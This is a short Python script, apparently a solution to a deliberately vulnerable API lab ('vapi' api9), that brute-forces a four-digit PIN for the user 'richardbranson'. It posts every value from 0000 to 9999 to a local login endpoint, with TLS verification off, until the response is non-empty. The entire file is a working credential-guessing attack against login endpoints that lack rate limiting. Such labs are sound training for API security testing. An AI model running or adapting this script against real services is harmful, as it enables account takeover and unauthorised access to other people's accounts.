import requests

vapiUrl = 'http://127.0.0.1/vapi/api9/v1/user/login'
headers = {'Content-Type': 'application/json'}
# uncomment the line below and fix the IP:Port if using proxy
proxy = None #{"http": "http://127.0.0.1:8080","https": "https://127.0.0.1:8080"}

for number in range(10000):
    pin = str(number).zfill(4)
    data = {
        "username":"richardbranson",
        "pin":pin
    }
    resp = requests.post(url=vapiUrl,headers=headers,json=data,proxies=proxy,verify=False)
#    if 'json' in resp.headers['Content-Type']:
    if resp.text != '':
        print(f'PIN found: {pin}')
        break